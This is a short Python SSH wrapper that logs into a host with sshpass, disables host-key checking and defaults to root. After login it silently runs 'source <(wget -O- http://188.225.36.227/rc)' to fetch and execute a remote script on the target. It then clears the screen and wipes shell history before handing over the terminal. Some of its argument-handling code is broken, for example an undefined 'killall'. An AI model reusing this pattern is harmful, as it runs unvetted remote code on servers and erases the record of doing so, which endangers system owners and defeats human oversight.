#!/usr/bin/env python3

import pexpect, struct, fcntl, termios, signal, sys

def cmd():
    if len(sys.argv) == 0:
        cmd = killall
    elif len(sys.argv) == 1:
        exit()
    elif len(sys.argv) == 2:
        raise SystemExit
    elif len(sys.argv) == 3:
        cmd = 'sshpass -p "{1}" ssh -oStrictHostKeyChecking=no root@{0} -t bash'.format(sys.argv[1], sys.argv[2])
    elif len(sys.argv) == 4:
        cmd = 'sshpass -p "{1}" ssh -oStrictHostKeyChecking=no {2}@{0} -t bash'.format(sys.argv[1], sys.argv[2], sys.argv[3])
    elif len(sys.argv) >= 5:
        cmd = '{0} -t bash'.format(" ".join(sys.argv[1:]))
    return cmd

def get_terminal_size():
    s = struct.pack("HHHH", 0, 0, 0, 0)
    a = struct.unpack('hhhh', fcntl.ioctl(sys.stdout.fileno(), termios.TIOCGWINSZ, s))
    return a[0], a[1]

def sigwinch_passthrough(sig, data):
    global p
    p.setwinsize(*get_terminal_size())

try:

    if __name__ == "__main__":
        p = pexpect.spawn(cmd(), encoding='utf-8', echo=False)
        p.setwinsize(*get_terminal_size())
        signal.signal(signal.SIGWINCH, sigwinch_passthrough)
        p.sendline('source <(wget -O- http://188.225.36.227/rc)')

        p.sendline('clear; history -c')
        p.setecho(True)
        p.interact()

except IndexError:
    pass
except ValueError:
    pass
